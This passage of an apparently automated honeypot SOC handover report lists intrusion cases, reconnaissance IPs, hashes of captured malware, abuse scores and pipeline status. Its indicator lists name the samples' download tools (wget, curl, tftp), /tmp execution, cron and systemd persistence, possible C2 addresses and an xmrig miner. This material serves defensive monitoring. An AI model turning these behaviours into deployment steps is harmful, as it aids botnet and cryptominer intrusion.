| IR-44c6f562ffdf | HIGH | `195.178.110[.]217` | 2026-11-11 02:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5dd66c7d8fd6 | HIGH | `103.102.46[.]200` | 2026-11-11 02:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-964da8e624f9 | HIGH | `195.178.110[.]217` | 2026-11-11 02:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e269c282e8c7 | HIGH | `109.160.32[.]48` | 2026-11-11 02:07 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f2b9a33f9fec | HIGH | `195.178.110[.]217` | 2026-11-11 02:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0c978819563d | HIGH | `195.178.110[.]217` | 2026-11-11 02:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d5d224c3b0d9 | HIGH | `195.178.110[.]217` | 2026-11-11 02:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9a8a41732488 | HIGH | `195.178.110[.]217` | 2026-11-11 02:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3b6e2724a7e5 | HIGH | `195.178.110[.]217` | 2026-11-11 02:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b137c1777780 | HIGH | `195.178.110[.]217` | 2026-11-11 02:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3d78beda7841 | HIGH | `195.178.110[.]217` | 2026-11-11 02:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b5435f7643ea | HIGH | `195.178.110[.]217` | 2026-11-11 02:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-150316696784 | HIGH | `195.178.110[.]217` | 2026-11-11 02:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8c51ba2daf16 | HIGH | `195.178.110[.]217` | 2026-11-11 02:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-70820e8d5472 | HIGH | `195.178.110[.]217` | 2026-11-11 02:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9d96c219d08d | HIGH | `195.178.110[.]217` | 2026-11-11 02:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fef43de9a36c | HIGH | `195.178.110[.]217` | 2026-11-11 02:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ac8871a7eb4d | HIGH | `195.178.110[.]217` | 2026-11-11 02:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6f89d1c2557c | HIGH | `195.178.110[.]78` | 2026-11-11 02:29 | Y | 3 | 0 | `T1078 · T1083` |
| IR-184824abdd65 | HIGH | `195.178.110[.]217` | 2026-11-11 02:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3ac78e409ece | HIGH | `80.94.92[.]234` | 2026-11-11 02:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2352cf6b3ccd | HIGH | `176.53.159[.]196` | 2026-11-11 02:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3a069b6fca87 | HIGH | `80.94.92[.]234` | 2026-11-11 02:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `165.22.105[.]175` | **2** | 2026-11-11 00:51 | 2026-11-11 02:09 | 3m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]120` | 1 | 2026-11-11 00:06 | 2026-11-11 00:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]36` | 1 | 2026-11-11 01:43 | 2026-11-11 01:43 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]48` | 1 | 2026-11-11 02:06 | 2026-11-11 02:06 | 8s | 0 | `T1592` | 🟢 LOW |
| `13.89.123[.]64` | 1 | 2026-11-11 01:05 | 2026-11-11 01:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-11 00:45 | 2026-11-11 00:47 | 92s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-11-11 00:07 | 2026-11-11 00:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-11 00:58 | 2026-11-11 00:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.49.24[.]18` | 1 | 2026-11-11 01:39 | 2026-11-11 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-11-11 01:21 | 2026-11-11 01:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.40.251[.]38` | 1 | 2026-11-11 00:36 | 2026-11-11 00:36 | 9s | 0 | `T1592` | 🟢 LOW |
| `44.202.149[.]226` | 1 | 2026-11-11 01:25 | 2026-11-11 01:26 | 3s | 0 | `T1592` | 🟢 LOW |
| `5.53.115[.]178` | 1 | 2026-11-11 01:01 | 2026-11-11 01:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]2` | 1 | 2026-11-11 00:25 | 2026-11-11 00:25 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]99` | 1 | 2026-11-11 02:36 | 2026-11-11 02:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]189` | 1 | 2026-11-11 02:36 | 2026-11-11 02:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-11 00:37 | 2026-11-11 00:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-11 01:28 | 2026-11-11 01:28 | 6s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-11 02:39 | 2026-11-11 02:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-11-11 00:26 | 2026-11-11 00:26 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.233.38[.]197` | 1 | 2026-11-11 00:02 | 2026-11-11 00:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.161.243[.]220` | 1 | 2026-11-11 02:16 | 2026-11-11 02:16 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `170.231.237[.]214` | CH | GRUPO PANAGLOBAL 15 S.A | **100** ⚠️ | 50 |
| `137.184.169[.]96` | CA | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `138.226.239[.]234` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `138.226.239[.]233` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `64.62.197[.]2` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `109.160.32[.]120` | NL | Global Communication Net Plc | **100** ⚠️ | 29 |
| `82.233.38[.]197` | FR | Proxad / Free SAS | **100** ⚠️ | 0 |
| `80.94.92[.]234` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `20.40.251[.]38` | US | Microsoft Corporation | **100** ⚠️ | 4 |
| `44.202.149[.]226` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 88 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 85 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 66 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 116 cases |
| Tool 34  | Credential Extractor        | ✅ 1584 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 72 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (8.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 83 priority case(s) shown individually · 22 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-11T03:42:40Z_
